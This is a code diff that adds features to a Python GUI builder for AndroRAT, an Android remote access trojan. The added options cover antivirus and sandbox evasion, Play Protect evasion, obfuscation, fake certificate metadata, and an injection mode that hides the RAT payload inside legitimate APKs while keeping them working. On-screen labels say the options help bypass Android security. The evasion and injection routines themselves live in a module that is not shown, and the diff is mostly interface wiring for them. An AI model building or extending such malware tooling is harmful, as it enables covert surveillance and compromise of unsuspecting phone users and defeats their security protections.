@@ -41,6 +41,18 @@ class AndroRATGUI:
         self.tunnel_var = tk.BooleanVar()
         self.tunnel_service_var = tk.StringVar(value="auto")
         
+        # Advanced evasion variables
+        self.stealth_var = tk.BooleanVar()
+        self.anti_analysis_var = tk.BooleanVar()
+        self.play_protect_var = tk.BooleanVar()
+        self.advanced_obfuscation_var = tk.BooleanVar()
+        self.fake_certificates_var = tk.BooleanVar()
+        self.random_package_var = tk.BooleanVar()
+        
+        # APK injection variables
+        self.inject_var = tk.BooleanVar()
+        self.target_apk_var = tk.StringVar()
+        
         # Create notebook for tabs
         self.notebook = ttk.Notebook(root)
         self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
@@ -145,6 +157,69 @@ class AndroRATGUI:
         
         ttk.Checkbutton(output_frame, text="Visible icon after installation", 
                        variable=self.icon_var).pack(anchor=tk.W, pady=5)
+        
+        # Advanced Evasion Options
+        evasion_frame = ttk.LabelFrame(config_frame, text="Advanced Evasion Options", padding=5)
+        evasion_frame.pack(fill=tk.X, pady=5)
+        
+        # Evasion checkboxes arranged in two columns
+        evasion_cols = ttk.Frame(evasion_frame)
+        evasion_cols.pack(fill=tk.X)
+        
+        # Left column
+        left_col = ttk.Frame(evasion_cols)
+        left_col.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        
+        ttk.Checkbutton(left_col, text="🛡️ Maximum Stealth Mode", 
+                       variable=self.stealth_var).pack(anchor=tk.W, pady=2)
+        ttk.Checkbutton(left_col, text="🔍 Anti-Analysis & Sandbox Evasion", 
+                       variable=self.anti_analysis_var).pack(anchor=tk.W, pady=2)
+        ttk.Checkbutton(left_col, text="🛡️ Play Protect Evasion", 
+                       variable=self.play_protect_var).pack(anchor=tk.W, pady=2)
+        
+        # Right column
+        right_col = ttk.Frame(evasion_cols)
+        right_col.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        
+        ttk.Checkbutton(right_col, text="🔐 Advanced String Obfuscation", 
+                       variable=self.advanced_obfuscation_var).pack(anchor=tk.W, pady=2)
+        ttk.Checkbutton(right_col, text="📜 Fake Certificate Metadata", 
+                       variable=self.fake_certificates_var).pack(anchor=tk.W, pady=2)
+        ttk.Checkbutton(right_col, text="📦 Random Package Name", 
+                       variable=self.random_package_var).pack(anchor=tk.W, pady=2)
+        
+        # Evasion info
+        evasion_info = ttk.Label(evasion_frame, 
+                                text="💡 These options help bypass Android security and antivirus detection",
+                                font=('TkDefaultFont', 9), foreground="blue")
+        evasion_info.pack(anchor=tk.W, pady=5)
+        
+        # APK Injection Options
+        injection_frame = ttk.LabelFrame(config_frame, text="APK Injection Mode", padding=5)
+        injection_frame.pack(fill=tk.X, pady=5)
+        
+        ttk.Checkbutton(injection_frame, text="💉 Inject into existing APK (preserves original functionality)", 
+                       variable=self.inject_var, command=self.on_inject_toggle).pack(anchor=tk.W, pady=2)
+        
+        # Target APK selection
+        self.target_frame = ttk.Frame(injection_frame)
+        self.target_frame.pack(fill=tk.X, pady=5)
+        
+        ttk.Label(self.target_frame, text="Target APK:").pack(side=tk.LEFT)
+        self.target_entry = ttk.Entry(self.target_frame, textvariable=self.target_apk_var, width=30)
+        self.target_entry.pack(side=tk.LEFT, padx=(5, 10))
+        
+        ttk.Button(self.target_frame, text="Browse APK", 
+                  command=self.browse_target_apk).pack(side=tk.LEFT)
+        
+        # Initially disable target APK selection
+        self.target_entry.config(state='disabled')
+        self.target_frame.pack_forget()
+        
+        injection_info = ttk.Label(injection_frame, 
+                                  text="💡 Injects RAT payload into legitimate apps while preserving their functionality",
+                                  font=('TkDefaultFont', 9), foreground="green")
+        injection_info.pack(anchor=tk.W, pady=2)
         
         # Build button
         button_frame = ttk.Frame(build_frame)
@@ -274,6 +349,39 @@ class AndroRATGUI:
         )
         if filename:
             self.output_var.set(os.path.basename(filename))
+    
+    def on_inject_toggle(self):
+        """Handle APK injection checkbox toggle"""
+        if self.inject_var.get():
+            self.target_frame.pack(fill=tk.X, pady=5)
+            self.target_entry.config(state='normal')
+            self.add_log("APK injection mode enabled")
+        else:
+            self.target_frame.pack_forget()
+            self.target_entry.config(state='disabled')
+            self.target_apk_var.set("")
+            self.add_log("APK injection mode disabled")
+    
+    def browse_target_apk(self):
+        """Browse for target APK file"""
+        filename = filedialog.askopenfilename(
+            title="Select target APK to inject into...",
+            filetypes=[("APK files", "*.apk"), ("All files", "*.*")]
+        )
+        if filename:
+            self.target_apk_var.set(filename)
+            self.add_log(f"Target APK selected: {os.path.basename(filename)}")
+            
+    def get_evasion_options(self):
+        """Get current evasion options as dictionary"""
+        return {
+            'stealth': self.stealth_var.get(),
+            'random_package': self.random_package_var.get(),
+            'anti_analysis': self.anti_analysis_var.get(),
+            'play_protect_evasion': self.play_protect_var.get(),
+            'advanced_obfuscation': self.advanced_obfuscation_var.get(),
+            'fake_certificates': self.fake_certificates_var.get()
+        }
             
     def add_log(self, message, level="INFO"):
         """Add a message to the log"""
@@ -309,7 +417,19 @@ class AndroRATGUI:
                 
     def validate_build_inputs(self):
         """Validate inputs for APK building"""
-        # Check if either tunneling or manual IP is specified
+        # Check injection mode specific validation
+        if self.inject_var.get():
+            if not self.target_apk_var.get():
+                messagebox.showerror("Error", "Target APK file is required for injection mode")
+                return False
+            if not os.path.exists(self.target_apk_var.get()):
+                messagebox.showerror("Error", "Target APK file does not exist")
+                return False
+            if not self.target_apk_var.get().lower().endswith('.apk'):
+                messagebox.showerror("Error", "Target file must be an APK")
+                return False
+        
+        # Check if either tunneling or manual IP is specified (not needed for injection with manual IP)
         using_tunnel = self.ngrok_var.get() or self.tunnel_var.get()
         
         if not using_tunnel:
@@ -410,10 +530,49 @@ class AndroRATGUI:
                     
             self.message_queue.put(("log", f"Building APK with IP: {final_ip}, Port: {final_port}"))
             
-            # Call build function from utils
-            build(final_ip, str(final_port), output, use_tunneling, str(port) if use_tunneling else None, icon)
+            # Get evasion options
+            evasion_options = self.get_evasion_options()
             
-            self.message_queue.put(("success", f"APK built successfully: {output}"))
+            # Check if any evasion options are enabled
+            has_evasion = any(evasion_options.values())
+            if has_evasion:
+                self.message_queue.put(("log", "Applying advanced evasion techniques..."))
+                evasion_list = [k for k, v in evasion_options.items() if v]
+                self.message_queue.put(("log", f"Active evasions: {', '.join(evasion_list)}"))
+            
+            # Check if using injection mode
+            if self.inject_var.get():
+                self.message_queue.put(("log", "APK injection mode enabled"))
+                self.message_queue.put(("log", f"Target APK: {self.target_apk_var.get()}"))
+                
+                # Use injection function
+                from utils import inject_rat_into_apk
+                success = inject_rat_into_apk(
+                    self.target_apk_var.get(),
+                    final_ip,
+                    str(final_port),
+                    output,
+                    evasion_options
+                )
+                
+                if success:
+                    self.message_queue.put(("success", f"APK injection completed: {output}"))
+                    self.message_queue.put(("log", "Original app functionality preserved with RAT payload"))
+                else:
+                    self.message_queue.put(("error", "APK injection failed"))
+                    return
+            else:
+                # Use standard build with evasion if enabled
+                if has_evasion:
+                    from utils import build_with_evasion
+                    build_with_evasion(final_ip, str(final_port), output, use_tunneling, 
+                                     str(port) if use_tunneling else None, icon, evasion_options)
+                else:
+                    # Standard build
+                    build(final_ip, str(final_port), output, use_tunneling, 
+                          str(port) if use_tunneling else None, icon)
+                
+                self.message_queue.put(("success", f"APK built successfully: {output}"))
             
             # If tunneling was used, optionally keep tunnel alive
             if tunnel_manager:
